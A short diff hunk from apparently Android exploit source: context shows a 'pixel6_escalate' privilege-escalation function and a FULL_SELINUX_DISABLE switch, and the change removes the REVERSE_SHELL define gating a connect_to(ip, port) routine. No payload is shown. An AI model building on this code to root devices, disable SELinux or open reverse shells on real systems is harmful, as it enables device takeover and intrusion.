@@ -183,7 +183,7 @@ int pixel6_escalate(struct rw_info *rw) {
 }
 
 #define FULL_SELINUX_DISABLE
-#define REVERSE_SHELL
+
 
 #ifdef REVERSE_SHELL
 int connect_to(const char *ip, int port) {
